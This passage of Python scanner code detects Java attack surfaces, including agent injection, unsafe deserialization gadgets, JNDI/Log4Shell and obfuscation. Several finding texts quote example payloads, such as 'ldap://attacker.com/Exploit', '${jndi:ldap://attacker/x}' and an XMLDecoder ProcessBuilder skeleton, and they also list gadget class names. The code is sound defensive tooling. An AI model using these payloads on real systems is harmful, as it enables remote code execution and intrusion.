    """Detect Java agent injection patterns: premain/agentmain entrypoints,
    Instrumentation API class redefinition, agent manifest declarations, and
    bytecode manipulation library references.

    Java agents are the JVM analog to DLL injection (PMA Ch.12): they load into
    the target JVM at startup (-javaagent:) or via dynamic attach and execute
    arbitrary code in that JVM's context.  Decompiling Java Ch.2 establishes
    that classfile bytecode retains full symbolic information, making it the
    manipulation surface that frameworks such as ByteBuddy/ASM exploit.
    """
    findings: list = []

    # premain — Java agent loaded at JVM startup (-javaagent:)
    if b'premain' in binary_data:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_AGENT_PREMAIN — Java agent with premain, loads before application',
            'detail':   ('premain method detected; Java agents with premain are loaded by the '
                         'JVM before application main() runs (-javaagent: flag); '
                         'agent executes in the same JVM with full Instrumentation access; '
                         'analog to DLL injection at startup (PMA Ch.12): agent code runs in '
                         'the target JVM context without application consent; '
                         'inspect MANIFEST.MF Premain-Class attribute and agent jar for payload'),
            'host':     'localhost',
            'port':     0,
        })

    # agentmain — dynamic attach agent; injects into a running JVM without restart
    if b'agentmain' in binary_data:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_AGENT_AGENTMAIN — dynamic attach agent, can modify running JVM',
            'detail':   ('agentmain method detected; dynamic-attach agents are injected into a '
                         'running JVM via the Attach API (com.sun.tools.attach.VirtualMachine); '
                         'no restart required; analog to CreateRemoteThread / direct injection '
                         'into a live process (PMA Ch.12 direct injection); '
                         'agentmain can call Instrumentation.redefineClasses to hot-patch any '
                         'loaded class at runtime; identify the attaching process and agent jar'),
            'host':     'localhost',
            'port':     0,
        })

    # Instrumentation + class redefinition — runtime class hot-patching
    has_instrumentation = b'Instrumentation' in binary_data
    has_redefine        = b'redefineClasses' in binary_data
    has_retransform     = b'retransformClasses' in binary_data
    if has_instrumentation and (has_redefine or has_retransform):
        op = 'redefineClasses' if has_redefine else 'retransformClasses'
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JVM_CLASS_REDEFINE — runtime class redefinition via instrumentation',
            'detail':   (f'Instrumentation API + {op} detected; '
                         'redefineClasses replaces bytecode of a loaded class at runtime with '
                         'no classloader involvement — equivalent to overwriting executable memory '
                         'of a running process (PMA Ch.12 process replacement analog); '
                         'retransformClasses invokes registered ClassFileTransformers before reload; '
                         'both allow arbitrary logic injection into any already-loaded class; '
                         'inspect all ClassFileTransformer.transform() implementations for payload'),
            'host':     'localhost',
            'port':     0,
        })

    # Premain-Class in MANIFEST.MF — agent declared in manifest
    if b'Premain-Class' in binary_data:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_AGENT_MANIFEST — Java agent declared in manifest',
            'detail':   ('Premain-Class attribute found; JAR is packaged as a Java agent; '
                         'JVM loads it automatically when -javaagent: is on the command line; '
                         'check for Agent-Class (dynamic attach) and Can-Redefine-Classes / '
                         'Can-Retransform-Classes capability flags in manifest; '
                         'manifest-declared agents bypass the application classloader — '
                         'they are the Java equivalent of a PE entry-point stub (PMA Ch.18)'),
            'host':     'localhost',
            'port':     0,
        })

    # Bytecode manipulation libraries — runtime bytecode modification frameworks
    bm_libs: list = []
    if b'ByteBuddy' in binary_data or b'net/bytebuddy' in binary_data:
        bm_libs.append('ByteBuddy')
    if b'Javassist' in binary_data or b'javassist' in binary_data:
        bm_libs.append('Javassist')
    if b'org/objectweb/asm' in binary_data or b'ClassWriter' in binary_data:
        bm_libs.append('ASM')
    if bm_libs:
        findings.append({
            'severity': 'HIGH',
            'title':    'BYTECODE_MANIPULATION_LIBRARY — runtime bytecode modification framework',
            'detail':   (f'Bytecode manipulation framework(s) detected: {", ".join(bm_libs)}; '
                         'these libraries generate or modify JVM bytecode at runtime — '
                         'used for legitimate AOP/mocking but also for covert class patching '
                         'and payload injection into loaded classes (Decompiling Java Ch.2: '
                         'classfile bytecode retains full symbolic info as the manipulation surface); '
                         'ByteBuddy: high-level class generation; Javassist: source-level bytecode '
                         'edit; ASM: raw instruction-level manipulation; '
                         'audit all MethodVisitor/ClassWriter call sites for injected logic'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def detect_java_native_code_execution(binary_data: bytes) -> list:
    """Detect Java native code execution vectors: JNI native library loading,
    OS command execution via Runtime/ProcessBuilder, System.load with absolute
    path, and sun.misc.Unsafe direct/arbitrary memory access.

    Informed by: PMA Ch.12 code injection (JNI = DLL injection analog; Runtime.exec
    = CreateProcess/backdoor launcher); PMA Ch.11 malware behavior (dropper writes
    native lib then loads it); PMA Ch.19 shellcode (Unsafe null-base write is the
    Java near-arbitrary memory write primitive); JVM Performance Engineering
    (Unsafe.allocateMemory = off-heap native allocation, escape from JVM model).
    """
    findings: list = []

    # native keyword + System.loadLibrary — JNI native library loaded
    has_native_kw = b'native ' in binary_data or b'\x00native\x00' in binary_data
    has_load_lib  = b'loadLibrary' in binary_data
    if has_native_kw and has_load_lib:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JNI_NATIVE_CODE — JNI native library loaded',
            'detail':   ('native method declaration + System.loadLibrary detected; '
                         'JNI is the Java-to-C/C++ bridge; native methods execute outside '
                         'JVM sandbox with no bytecode verification, no GC safety, and '
                         'direct OS/memory access; '
                         'analog to a loaded DLL executing native x86 in the host process '
                         '(PMA Ch.12 DLL injection); '
                         'extract the loadLibrary argument to identify the native library name; '
                         'analyze native library for shellcode/network/persistence using '
                         'standard PE/ELF static analysis (PMA Ch.1 basic static techniques)'),
            'host':     'localhost',
            'port':     0,
        })

    # Runtime.exec or ProcessBuilder — OS command execution
    has_runtime_exec = b'Runtime' in binary_data and b'exec' in binary_data
    has_proc_builder = b'ProcessBuilder' in binary_data
    if has_runtime_exec or has_proc_builder:
        vecs = []
        if has_runtime_exec:
            vecs.append('Runtime.exec')
        if has_proc_builder:
            vecs.append('ProcessBuilder')
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_OS_COMMAND_EXEC — OS command execution',
            'detail':   (f'OS command execution vector(s) detected: {", ".join(vecs)}; '
                         'Runtime.exec() and ProcessBuilder fork a child process with the '
                         'full OS privileges of the JVM user; '
                         'if the command string derives from user input or a network source, '
                         'this is a command injection surface; '
                         'analog to CreateProcess/ShellExecute in Windows malware '
                         '(PMA Ch.11 launchers and backdoors); '
                         'trace dataflow from exec()/start() back to the command string source; '
                         'static command = backdoor; dynamic source = injection vector'),
            'host':     'localhost',
            'port':     0,
        })

    # System.load( with absolute path — native lib from attacker-controlled path
    if b'System.load(' in binary_data:
        findings.append({
            'severity': 'HIGH',
            'title':    'SYSTEM_LOAD_ABSOLUTE_PATH — native lib from absolute path',
            'detail':   ('System.load() with explicit path detected (vs System.loadLibrary '
                         'which uses java.library.path); absolute-path loading bypasses the '
                         'standard library search path and can load arbitrary native code '
                         'from attacker-controlled filesystem locations; '
                         'common in droppers that write a native library to a temp path then '
                         'load it — mirrors the PE dropper pattern (PMA Ch.11) where malware '
                         'writes a DLL to disk then calls LoadLibrary from the written path; '
                         'extract the path argument; check for world-writable target directory'),
            'host':     'localhost',
            'port':     0,
        })

    # sun.misc.Unsafe or jdk.internal.misc.Unsafe — direct off-heap memory access
    has_unsafe = (b'sun/misc/Unsafe' in binary_data or b'sun.misc.Unsafe' in binary_data or
                  b'jdk/internal/misc/Unsafe' in binary_data or
                  b'jdk.internal.misc.Unsafe' in binary_data)
    if has_unsafe:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_UNSAFE_MEMORY — direct memory access via Unsafe',
            'detail':   ('sun.misc.Unsafe / jdk.internal.misc.Unsafe reference detected; '
                         'Unsafe provides direct off-heap allocation (allocateMemory), '
                         'arbitrary address reads/writes (getLong/putLong), and CAS operations '
                         'without JVM safety guarantees; bypasses GC, bounds checking, type safety; '
                         'used in high-performance libraries but also for JVM exploitation: '
                         'allocateMemory returns a raw native pointer usable for shellcode staging '
                         '(JVM Performance Engineering: Unsafe = deliberate JVM model escape hatch); '
                         'audit all Unsafe.getUnsafe() / theUnsafe acquisition sites and '
                         'trace address arithmetic to confirm exploitation intent'),
            'host':     'localhost',
            'port':     0,
        })

    # Unsafe.allocateMemory or null-base put* — near-arbitrary memory write primitive
    has_alloc_mem  = b'allocateMemory' in binary_data
    has_null_write = (b'putInt(null' in binary_data or b'putLong(null' in binary_data or
                      b'putObject(null' in binary_data)
    if has_alloc_mem or has_null_write:
        parts = []
        if has_alloc_mem:
            parts.append('allocateMemory (off-heap native allocation)')
        if has_null_write:
            parts.append('null-base put* call (write to absolute address 0+offset)')
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_UNSAFE_ARBITRARY_WRITE — null-base Unsafe write (near-arbitrary memory)',
            'detail':   (f'Unsafe exploitation primitives detected: {"; ".join(parts)}; '
                         'Unsafe.allocateMemory returns a raw native address usable as shellcode '
                         'staging buffer (analog to VirtualAllocEx in Windows DLL injection, '
                         'PMA Ch.12 direct injection); '
                         'putInt/putLong/putObject with null base + long offset computes address '
                         'as 0+offset enabling writes to near-arbitrary memory — '
                         'the Java analog to a null-dereference write primitive; '
                         'on JVMs without ASLR or with known heap layout this achieves code '
                         'execution; patterns appear in JVM exploits and in serialization gadget '
                         'chains that escape the JVM sandbox (ysoserial / SerialKiller payloads)'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def detect_java_deserialization_patterns(binary_data: bytes) -> list:
    """Detect Java deserialization attack surface and known gadget chain markers.

    Args:
        binary_data: Raw bytes of a .class, .jar, or arbitrary binary artifact.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    import re as _re

    findings = []

    # ── Magic bytes: Java serialized stream (0xAC 0xED 0x00 0x05) ─────────────
    if binary_data[:2] == b'\xac\xed' and binary_data[2:4] == b'\x00\x05':
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_SERIAL_MAGIC — Java serialized data present (deserialization attack surface)',
            'detail':   ('Java serialization magic bytes 0xACED0005 detected at offset 0; '
                         'stream is a serialized Java object graph; any endpoint that accepts '
                         'this payload and deserializes it without type validation is vulnerable '
                         'to gadget-chain exploitation (ysoserial / marshalsec payloads); '
                         'the magic alone confirms the deserialization surface exists'),
            'host':     'localhost',
            'port':     0,
        })
    elif b'\xac\xed\x00\x05' in binary_data:
        # Embedded serialized blob — e.g. inside a jar or network capture
        offset = binary_data.index(b'\xac\xed\x00\x05')
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_SERIAL_MAGIC — Java serialized data present (deserialization attack surface)',
            'detail':   (f'Java serialization magic bytes 0xACED0005 found at byte offset {offset}; '
                         'embedded serialized object suggests deserialization occurs somewhere in '
                         'this artifact; full gadget-chain risk applies if the deserializing '
                         'endpoint does not enforce an allowlist type filter'),
            'host':     'localhost',
            'port':     0,
        })

    # ── ObjectInputStream.readObject without type check ───────────────────────
    has_readobject   = b'readObject' in binary_data
    has_objinstream  = b'ObjectInputStream' in binary_data
    has_typeresolve  = (b'resolveClass' in binary_data or
                        b'ObjectInputFilter' in binary_data or
                        b'setObjectInputFilter' in binary_data)

    if has_readobject and has_objinstream and not has_typeresolve:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_READOBJECT_UNSAFE — ObjectInputStream.readObject without type validation (gadget chain risk)',
            'detail':   ('ObjectInputStream + readObject found without resolveClass override or '
                         'ObjectInputFilter configuration; any attacker-controlled byte stream '
                         'reaching this code path enables full gadget-chain exploitation; '
                         'the JVM will instantiate arbitrary classes present on the classpath '
                         'before readObject returns, giving pre-return code execution; '
                         'fix: implement a allowlist resolveClass, use java.io.ObjectInputFilter, '
                         'or replace with a non-serialization transport'),
            'host':     'localhost',
            'port':     0,
        })
    elif has_readobject and has_objinstream and has_typeresolve:
        # Filter present — lower confidence, still worth noting
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_READOBJECT_UNSAFE — ObjectInputStream.readObject without type validation (gadget chain risk)',
            'detail':   ('ObjectInputStream + readObject detected; a resolveClass or '
                         'ObjectInputFilter reference is also present but correctness of the '
                         'filter implementation cannot be verified statically; confirm the '
                         'allowlist is exhaustive and does not fall through to the default '
                         'deserializer on filter mismatch'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Known gadget-chain classes ─────────────────────────────────────────────
    gadget_markers = {
        b'CommonsBeanutils':    'Apache Commons BeanUtils BeanComparator gadget (ysoserial CommonsBeanutils1)',
        b'CommonsCollections':  'Apache Commons Collections gadget chain (ysoserial CC1-CC7)',
        b'InvokerTransformer':  'InvokerTransformer — core reflective invoker in all CC gadget chains',
        b'ChainedTransformer':  'ChainedTransformer — links multiple Transformer gadgets into an execution chain',
    }
    found_gadgets = []
    for marker, desc in gadget_markers.items():
        if marker in binary_data:
            found_gadgets.append(f'{marker.decode()}: {desc}')

    if found_gadgets:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_GADGET_CHAIN — known deserialization gadget class present',
            'detail':   ('One or more well-known deserialization gadget classes detected: '
                         + '; '.join(found_gadgets) + '; '
                         'presence of these class names indicates either (a) a library with '
                         'exploitable gadgets is on the classpath, or (b) a payload containing '
                         'these class references is embedded in the artifact; '
                         'either condition enables remote code execution via an ObjectInputStream '
                         'deserialization endpoint; remediate by removing Commons libraries or '
                         'upgrading to patched versions and enforcing a type-filter allowlist'),
            'host':     'localhost',
            'port':     0,
        })

    # ── XMLDecoder / XStream deserialization ──────────────────────────────────
    has_xmldecoder  = b'XMLDecoder' in binary_data
    has_xstream     = b'XStream' in binary_data or b'xstream' in binary_data
    has_readobj_xml = b'readObject' in binary_data  # XMLDecoder also uses readObject

    if has_xmldecoder or has_xstream:
        flavours = []
        if has_xmldecoder:
            flavours.append('XMLDecoder (java.beans.XMLDecoder — deserializes arbitrary Java '
                            'XML bean expressions; any attacker-controlled XML triggers '
                            'Runtime.exec() via ProcessBuilder bean construction)')
        if has_xstream:
            flavours.append('XStream (com.thoughtworks.xstream — CVE-2021-29505, '
                            'CVE-2021-39144; deserializes XML/JSON to arbitrary types; '
                            'pre-1.4.18 has no allowlist by default)')
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_XMLDECODER_RDESERIALIZATION — XMLDecoder/XStream deserialization (arbitrary command execution)',
            'detail':   ('XML-based deserialization surface detected: ' + '; '.join(flavours) + '; '
                         'these libraries deserialize attacker-controlled documents into live '
                         'Java objects without bytecode restrictions; the canonical payload '
                         '<java><object class="java.lang.ProcessBuilder">...</object></java> '
                         'achieves OS command execution on any unpatched XMLDecoder endpoint; '
                         'fix: do not deserialize untrusted XML with XMLDecoder; replace XStream '
                         'with a type-safe format (Jackson with strict type info, or JSON schema '
                         'validated data binding)'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def detect_jndi_injection_surface(binary_data: bytes) -> list:
    """Detect JNDI injection vectors including Log4Shell (CVE-2021-44228) patterns.

    Args:
        binary_data: Raw bytes of a .class, .jar, or arbitrary binary artifact.

    Returns:
        List of finding dicts with keys: severity, title, detail, host, port.
    """
    import struct as _struct

    findings = []

    # ── InitialContext.lookup without input validation ─────────────────────────
    has_initial_ctx  = b'InitialContext' in binary_data
    has_lookup       = b'lookup' in binary_data
    # Heuristic: presence of user-input-adjacent strings alongside lookup
    input_adjacent   = (b'getParameter' in binary_data or
                        b'getHeader' in binary_data or
                        b'getInputStream' in binary_data or
                        b'readLine' in binary_data or
                        b'request' in binary_data)
    has_validation   = (b'validate' in binary_data or
                        b'sanitize' in binary_data or
                        b'whitelist' in binary_data or
                        b'allowlist' in binary_data or
                        b'Pattern.compile' in binary_data)

    if has_initial_ctx and has_lookup:
        if not has_validation:
            severity = 'CRITICAL'
            detail_suffix = ('no input-validation marker (validate/sanitize/allowlist/Pattern) '
                             'found in the same artifact; lookup argument is likely unsanitized')
        else:
            severity = 'CRITICAL'
            detail_suffix = ('a validation marker is present but static analysis cannot confirm '
                             'it guards the lookup call path; manual trace required')

        findings.append({
            'severity': severity,
            'title':    'JNDI_LOOKUP_UNVALIDATED — InitialContext.lookup without input validation (JNDI injection, Log4Shell class)',
            'detail':   ('InitialContext + lookup detected' +
                         ('; request-input markers also present (getParameter/getHeader/getInputStream)'
                          if input_adjacent else '') + '; ' + detail_suffix + '; '
                         'an attacker supplying ldap://attacker.com/Exploit as the lookup '
                         'argument causes the JVM to fetch and instantiate a remote class, '
                         'yielding arbitrary code execution; '
                         'this is the core JNDI injection primitive exploited by Log4Shell '
                         '(CVE-2021-44228) and a class of JNDI gadgets across dozens of '
                         'Java frameworks; '
                         'fix: never pass user-controlled strings to InitialContext.lookup; '
                         'set com.sun.jndi.ldap.object.trustURLCodebase=false (Java >=8u191 '
                         'default); use JDK 17+ where remote classloading is disabled'),
            'host':     'localhost',
            'port':     0,
        })

    # ── LDAP/RMI URI construction near user input ──────────────────────────────
    uri_schemes = [b'ldap://', b'ldaps://', b'rmi://']
    found_schemes = [s.decode() for s in uri_schemes if s in binary_data]

    if found_schemes:
        severity = 'CRITICAL' if input_adjacent else 'HIGH'
        findings.append({
            'severity': severity,
            'title':    'JNDI_REMOTE_CLASSLOAD — JNDI remote class loading via LDAP/RMI (arbitrary code exec)',
            'detail':   ('Hard-coded or constructed JNDI URI schemes detected: '
                         + ', '.join(found_schemes) + '; '
                         + ('user-input markers also present — URI may be attacker-influenced; '
                            if input_adjacent else
                            'no request-input marker adjacent — may be config-driven, verify; ')
                         + 'LDAP and RMI lookup URIs enable remote class loading on JDKs prior '
                         'to 8u191/11.0.1 (trustURLCodebase defaulted to true); '
                         'even on patched JDKs deserialization gadgets in the LDAP response '
                         '(CVE-2021-44228 bypass via com.sun.jndi.ldap.object.trustSerialData) '
                         'restore code execution; '
                         'fix: block JNDI lookup of ldap/rmi URIs at the InitialContext layer; '
                         'deploy a JNDI exploit mitigation agent (noopJNDI / log4j-jndi-be-gone) '
                         'as an interim measure'),
            'host':     'localhost',
            'port':     0,
        })

    # ── Log4j Logger.getLogger + ${jndi: string ────────────────────────────────
    has_log4j_logger  = (b'Logger.getLogger' in binary_data or
                         b'LogManager.getLogger' in binary_data or
                         b'org/apache/logging/log4j' in binary_data or
                         b'org.apache.logging.log4j' in binary_data)
    has_jndi_template = (b'${jndi:' in binary_data or b'jndi:' in binary_data)

    if has_log4j_logger and has_jndi_template:
        findings.append({
            'severity': 'HIGH',
            'title':    'LOG4SHELL_PATTERN — Log4j JNDI lookup pattern (CVE-2021-44228)',
            'detail':   ('Log4j Logger reference combined with a ${jndi: template string '
                         'detected in the same artifact; '
                         'this combination is the canonical Log4Shell trigger; '
                         'if user-controlled data is logged via log4j and the runtime uses '
                         'log4j-core < 2.17.1, an attacker injects ${jndi:ldap://attacker/x} '
                         'into any logged field (User-Agent, username, X-Api-Version, etc.) '
                         'to achieve unauthenticated RCE; '
                         'the ${jndi: string here may be a test payload, a WAF bypass variant '
                         '(${${lower:j}ndi:...}), or a payload embedded in test data — '
                         'all warrant investigation; '
                         'fix: upgrade log4j-core to >= 2.17.1; set '
                         'log4j2.formatMsgNoLookups=true as a stopgap; '
                         'deploy a runtime patch (log4j-jndi-be-gone or the AWS hotpatch)'),
            'host':     'localhost',
            'port':     0,
        })
    elif has_log4j_logger:
        # Log4j present but no jndi template literal — still flag for version check
        findings.append({
            'severity': 'HIGH',
            'title':    'LOG4SHELL_PATTERN — Log4j JNDI lookup pattern (CVE-2021-44228)',
            'detail':   ('Log4j Logger reference detected (Logger.getLogger / LogManager.getLogger '
                         'or log4j package import); '
                         'artifact uses log4j; confirm log4j-core version is >= 2.17.1; '
                         'versions 2.0-beta9 through 2.17.0 are affected by CVE-2021-44228 '
                         'and related bypasses (CVE-2021-45046, CVE-2021-45105); '
                         'static analysis cannot confirm the runtime version — '
                         'check pom.xml / build.gradle / MANIFEST.MF for the exact jar version'),
            'host':     'localhost',
            'port':     0,
        })

    # ── javax.naming.directory.InitialDirContext ──────────────────────────────
    has_dir_ctx = (b'InitialDirContext' in binary_data or
                   b'javax/naming/directory' in binary_data or
                   b'javax.naming.directory' in binary_data)

    if has_dir_ctx:
        findings.append({
            'severity': 'HIGH',
            'title':    'JNDI_DIR_CONTEXT — JNDI directory context (LDAP injection surface)',
            'detail':   ('javax.naming.directory.InitialDirContext detected; '
                         'DirContext is the LDAP-capable sibling of InitialContext and is '
                         'used for LDAP search/modify operations; '
                         'if search filters or DN components are constructed from user input '
                         'without escaping (RFC 4515 / LDAP filter injection, RFC 4514 / DN injection) '
                         'an attacker can bypass authentication, read arbitrary LDAP entries, '
                         'or chain to JNDI injection via a malformed search result; '
                         'fix: use javax.naming.ldap.LdapName for DN construction; '
                         'escape filter values with JNDI filter-escape utilities '
                         '(org.springframework.ldap.support.LdapEncoder, '
                         'or OWASP Java Encoder LDAP filter encode); '
                         'never concatenate user strings directly into LDAP filter expressions'),
            'host':     'localhost',
            'port':     0,
        })

    return findings


def detect_java_deserialization_gadgets(binary_data: bytes, host: str = '', port: int = 0) -> list:
    """Detect Java deserialization vulnerability indicators in class files."""
    import struct as _struct
    findings = []

    if not binary_data:
        return findings

    # Java class file magic: 0xCAFEBABE
    is_class = len(binary_data) >= 4 and binary_data[:4] == b'\xca\xfe\xba\xbe'

    if is_class:
        findings.append({
            'severity': 'INFO',
            'title':    'JAVA_CLASS_FILE — Java class file magic confirmed',
            'detail':   ('Magic number 0xCAFEBABE confirmed; '
                         'file is a Java class file; '
                         'deserialization gadget analysis follows'),
            'host':     host,
            'port':     port,
        })

    # Serialization interface / ObjectInputStream
    has_serializable = (b'Ljava/io/Serializable;' in binary_data or
                        b'java/io/Serializable' in binary_data)
    has_object_input  = b'ObjectInputStream' in binary_data

    if has_serializable or has_object_input:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_SERIALIZABLE_CLASS — Serializable interface or ObjectInputStream',
            'detail':   ('Class implements java.io.Serializable or references ObjectInputStream; '
                         'serializable classes exposed to untrusted input are subject to '
                         'deserialization attacks; '
                         'review all readObject/readResolve implementations for reachable gadget chains; '
                         'fix: apply JEP 290 ObjectInputFilter to whitelist expected class types; '
                         'prefer JSON/protobuf over Java serialization for untrusted data'),
            'host':     host,
            'port':     port,
        })

    # Unsafe readObject + ObjectInputStream + Runtime
    has_read_object  = b'readObject' in binary_data
    has_runtime_ref  = (b'java/lang/Runtime' in binary_data or
                        b'java.lang.Runtime' in binary_data)

    if has_read_object and has_object_input and has_runtime_ref:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_UNSAFE_DESERIALIZE — Unsafe deserialization with Runtime access',
            'detail':   ('readObject, ObjectInputStream, and java.lang.Runtime present together; '
                         'a readObject implementation that reaches Runtime.exec() converts any '
                         'attacker-supplied serialized payload into RCE; '
                         'fix: remove Runtime references from deserialization code paths; '
                         'replace Java serialization with a safe format; '
                         'apply JEP 290 serialization filters'),
            'host':     host,
            'port':     port,
        })

    # Commons Collections gadget chain
    has_commons_coll  = (b'org/apache/commons/collections' in binary_data or
                         b'org.apache.commons.collections' in binary_data)
    has_invoker_xform = b'InvokerTransformer' in binary_data

    if has_commons_coll and has_invoker_xform:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_CC_GADGET_CHAIN — Apache Commons Collections gadget chain',
            'detail':   ('org.apache.commons.collections.functors.InvokerTransformer detected; '
                         'this is the core class in ysoserial CommonsCollections1-7 gadget chains; '
                         'if commons-collections is on the classpath and untrusted serialized data '
                         'is accepted by any ObjectInputStream, RCE is trivially achievable; '
                         'fix: upgrade commons-collections to >= 3.2.2 or >= 4.1; '
                         'apply JEP 290 filter blocking InvokerTransformer; '
                         'switch to a safe serialization format'),
            'host':     host,
            'port':     port,
        })

    # Spring gadget chain
    has_spring        = (b'org/springframework' in binary_data or
                         b'org.springframework' in binary_data)
    has_spring_gadget = (b'MethodInvoker' in binary_data or
                         b'ClassPathXmlApplicationContext' in binary_data)

    if has_spring and has_spring_gadget:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_SPRING_GADGET — Spring Framework deserialization gadget',
            'detail':   ('Spring MethodInvoker or ClassPathXmlApplicationContext detected '
                         'with org.springframework namespace; '
                         'these classes appear in ysoserial Spring1/Spring2 gadget chains; '
                         'ClassPathXmlApplicationContext can load a remote Spring XML context '
                         'from an attacker-controlled URL, enabling RCE; '
                         'fix: apply JEP 290 deserialization filter; '
                         'upgrade to Spring >= 4.3.5; '
                         'avoid deserializing untrusted Spring objects'),
            'host':     host,
            'port':     port,
        })

    # Groovy gadget chain
    has_groovy        = (b'org/codehaus/groovy' in binary_data or
                         b'org.codehaus.groovy' in binary_data)
    has_groovy_gadget = b'ConvertedClosure' in binary_data

    if has_groovy and has_groovy_gadget:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_GROOVY_GADGET — Groovy deserialization gadget chain',
            'detail':   ('org.codehaus.groovy.runtime.ConvertedClosure detected; '
                         'this is the entry point for the ysoserial Groovy1 gadget chain; '
                         'if Groovy is on the classpath and untrusted serialized data is accepted, '
                         'an attacker can execute arbitrary Groovy code via a crafted Closure; '
                         'fix: upgrade Groovy to >= 2.4.4; '
                         'apply deserialization filter blocking ConvertedClosure; '
                         'remove Groovy from runtime classpath if not required'),
            'host':     host,
            'port':     port,
        })

    # Runtime.exec invocation
    has_exec = b'exec' in binary_data

    if has_runtime_ref and has_exec:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_RUNTIME_EXEC — java.lang.Runtime.exec() invocation',
            'detail':   ('java.lang.Runtime and "exec" string both present; '
                         'Runtime.exec() reachable from deserialization code paths enables '
                         'command injection / RCE when the command argument incorporates '
                         'user-controlled data; '
                         'fix: replace Runtime.exec() with a fixed command array via ProcessBuilder; '
                         'apply strict input validation on all exec arguments'),
            'host':     host,
            'port':     port,
        })

    # ProcessBuilder
    has_pb = (b'java/lang/ProcessBuilder' in binary_data or
              b'java.lang.ProcessBuilder' in binary_data)

    if has_pb:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_PROCESSBUILDER_USAGE — ProcessBuilder detected',
            'detail':   ('java.lang.ProcessBuilder reference found; '
                         'used for OS process spawning; '
                         'if command arguments are constructed from deserialized or user-controlled '
                         'data without sanitization this enables command injection; '
                         'fix: use a fixed command array; validate all arguments; '
                         'apply SecurityManager policy to restrict process creation'),
            'host':     host,
            'port':     port,
        })

    # ReflectionFactory
    has_refl_factory = (b'sun/reflect/ReflectionFactory' in binary_data or
                        b'sun.reflect.ReflectionFactory' in binary_data or
                        b'jdk/internal/reflect/ReflectionFactory' in binary_data)

    if has_refl_factory:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_REFLECTION_FACTORY — sun.reflect.ReflectionFactory detected',
            'detail':   ('sun.reflect.ReflectionFactory (or jdk.internal.reflect.ReflectionFactory) '
                         'detected; '
                         'ReflectionFactory.newConstructorForSerialization() constructs objects '
                         'bypassing normal constructor chains, enabling gadget attacks on classes '
                         'without a no-arg constructor; '
                         'this API is used by ysoserial to instantiate otherwise non-deserializable '
                         'classes; '
                         'fix: review usages; block with deserialization filters; '
                         'avoid in production code'),
            'host':     host,
            'port':     port,
        })

    # URLClassLoader + network URL
    has_url_cl = (b'java/net/URLClassLoader' in binary_data or
                  b'java.net.URLClassLoader' in binary_data)
    has_http   = (b'http://' in binary_data or b'https://' in binary_data or
                  b'http' in binary_data)

    if has_url_cl and has_http:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'JAVA_NETWORK_CLASSLOAD — URLClassLoader with network URL',
            'detail':   ('java.net.URLClassLoader combined with HTTP/HTTPS URL reference; '
                         'URLClassLoader can fetch and execute arbitrary class files from '
                         'a remote URL; if the URL is attacker-controlled via deserialization '
                         'or injection this achieves RCE by loading a malicious class from '
                         'an attacker server; '
                         'fix: prohibit URLClassLoader from loading remote URLs; '
                         'apply SecurityManager with restrictive URLPermission; '
                         'validate all URL inputs and prefer classpath-local resources'),
            'host':     host,
            'port':     port,
        })

    return findings


def detect_java_obfuscation_patterns(binary_data: bytes, host: str = '', port: int = 0) -> list:
    """Detect Java bytecode obfuscation techniques."""
    import struct as _struct
    import re as _re
    findings = []

    if not binary_data:
        return findings

    # Only analyse Java class files — skip non-class binaries
    if len(binary_data) < 10 or binary_data[:4] != b'\xca\xfe\xba\xbe':
        return findings

    # ── Constant pool size ─────────────────────────────────────────────────────
    # Class file layout: magic(4) + minor_version(2) + major_version(2)
    # + constant_pool_count(2) ...  (Chapter 2, Decompiling Java)
    cp_count = _struct.unpack('>H', binary_data[8:10])[0]

    if cp_count > 1000:
        findings.append({
            'severity': 'MEDIUM',
            'title':    'JAVA_OVERSIZED_CONSTANT_POOL — Abnormally large constant pool',
            'detail':   (f'Constant pool count = {cp_count} (threshold: 1000); '
                         'an unusually large constant pool is a strong obfuscator indicator; '
                         'tools like ProGuard, Zelix KlassMaster, and Allatori inflate the '
                         'constant pool with synthetic entries, dummy string constants, '
                         'and redirect chains to hamper decompilers and static analysis; '
                         'fix: decompile with fernflower or CFR and audit for injected entries'),
            'host':     host,
            'port':     port,
        })

    # ── Class name obfuscation ─────────────────────────────────────────────────
    # CONSTANT_Utf8 tag = 0x01; layout: 0x01 + 2-byte big-endian length + bytes
    # Single-char and two-char lowercase names are classic obfuscator output
    single_char_names = _re.findall(b'\x01\x00\x01[a-z]', binary_data)
    two_char_names    = _re.findall(b'\x01\x00\x02[a-z][a-z]', binary_data)
    obfuscated_count  = len(single_char_names) + len(two_char_names)

    if obfuscated_count >= 3:
        findings.append({
            'severity': 'HIGH',
            'title':    'JAVA_CLASS_NAME_OBFUSCATED — Obfuscated class/field/method names',
            'detail':   (f'Found {obfuscated_count} single- or two-character lowercase UTF-8 '
                         'constant pool entries consistent with name obfuscation '
                         '(e.g., class "a", field "b", method "aa"); '
                         'this pattern is produced by ProGuard, Zelix KlassMaster, DashO, '
                         'and similar obfuscators that rename identifiers to minimal strings; '
